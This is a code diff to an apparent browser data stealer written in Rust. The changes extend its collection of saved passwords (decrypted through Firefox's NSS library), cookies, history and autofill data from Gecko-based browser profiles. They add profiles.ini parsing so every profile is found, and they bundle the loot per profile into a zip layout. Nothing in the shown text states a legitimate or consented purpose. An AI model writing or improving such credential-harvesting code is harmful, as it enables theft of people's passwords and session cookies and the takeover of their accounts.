@@ -24,13 +24,6 @@ fn get_browsers() -> Vec<GeckoBrowserInfo> {
             name: "LibreWolf",
             profiles_path: PathBuf::from(&roaming).join("librewolf").join("Profiles"),
         },
-        GeckoBrowserInfo {
-            name: "PaleMoon",
-            profiles_path: PathBuf::from(&roaming)
-                .join("Moonchild Productions")
-                .join("Pale Moon")
-                .join("Profiles"),
-        },
     ]
 }
 
@@ -254,7 +247,7 @@ fn extract_cookies(profile_path: &Path) -> Option<String> {
     drop(conn);
     cleanup_db(&temp);
     if count == 0 {
-        None
+        Some(super::netscape::empty_file())
     } else {
         super::netscape::build_file(&body)
     }
@@ -338,7 +331,73 @@ fn extract_autofill(profile_path: &Path) -> Option<String> {
 
 // ── Profile discovery ──────────────────────────────────────────────────────
 
+fn display_profile_name(ini_name: &str) -> String {
+    if ini_name.eq_ignore_ascii_case("default") {
+        "Default".to_string()
+    } else {
+        ini_name.to_string()
+    }
+}
+
+fn push_ini_profile(
+    profiles: &mut Vec<(String, PathBuf)>,
+    profiles_dir: &Path,
+    name: &str,
+    path: &str,
+) {
+    let profile_path = if Path::new(path).is_absolute() {
+        PathBuf::from(path)
+    } else {
+        profiles_dir.join(path)
+    };
+    if profile_path.is_dir() {
+        profiles.push((display_profile_name(name), profile_path));
+    }
+}
+
+fn parse_profiles_ini(ini: &Path, profiles_dir: &Path) -> Vec<(String, PathBuf)> {
+    let content = match fs::read_to_string(ini) {
+        Ok(c) => c,
+        Err(_) => return Vec::new(),
+    };
+
+    let mut profiles = Vec::new();
+    let mut current_name: Option<String> = None;
+    let mut current_path: Option<String> = None;
+
+    for line in content.lines() {
+        let line = line.trim();
+        if line.starts_with('[') && line.contains(']') {
+            if let (Some(name), Some(path)) = (current_name.take(), current_path.take()) {
+                push_ini_profile(&mut profiles, profiles_dir, &name, &path);
+            }
+            continue;
+        }
+        if let Some((key, value)) = line.split_once('=') {
+            match key.trim() {
+                "Name" => current_name = Some(value.trim().to_string()),
+                "Path" => current_path = Some(value.trim().to_string()),
+                _ => {}
+            }
+        }
+    }
+    if let (Some(name), Some(path)) = (current_name, current_path) {
+        push_ini_profile(&mut profiles, profiles_dir, &name, &path);
+    }
+    profiles
+}
+
 fn get_profiles(profiles_dir: &Path) -> Vec<(String, PathBuf)> {
+    if let Some(parent) = profiles_dir.parent() {
+        let ini = parent.join("profiles.ini");
+        if ini.exists() {
+            let parsed = parse_profiles_ini(&ini, profiles_dir);
+            if !parsed.is_empty() {
+                return parsed;
+            }
+        }
+    }
+
     let mut profiles = Vec::new();
     if let Ok(entries) = fs::read_dir(profiles_dir) {
         for entry in entries.flatten() {
@@ -365,24 +424,22 @@ pub fn extract_all() -> Vec<(String, String)> {
         let profiles = get_profiles(&browser.profiles_path);
 
         for (profile_name, profile_path) in profiles {
-            let folder = format!("{}/{}", browser.name, profile_name);
+            let passwords = firefox_dir
+                .as_ref()
+                .and_then(|ff| extract_passwords_nss(&profile_path, ff));
+            let cookies = extract_cookies(&profile_path);
+            let history = extract_history(&profile_path);
+            let autofill = extract_autofill(&profile_path);
 
-            // Passwords (requires nss3.dll from Firefox installation)
-            if let Some(ref ff_dir) = firefox_dir {
-                if let Some(data) = extract_passwords_nss(&profile_path, ff_dir) {
-                    results.push((format!("{}/passwords.txt", folder), data));
-                }
-            }
-
-            if let Some(data) = extract_cookies(&profile_path) {
-                results.push((format!("{}/cookies.txt", folder), data));
-            }
-            if let Some(data) = extract_history(&profile_path) {
-                results.push((format!("{}/history.txt", folder), data));
-            }
-            if let Some(data) = extract_autofill(&profile_path) {
-                results.push((format!("{}/autofill.txt", folder), data));
-            }
+            super::zip_layout::push_profile_bundle(
+                &mut results,
+                browser.name,
+                &profile_name,
+                passwords,
+                cookies,
+                history,
+                autofill,
+            );
         }
     }
 
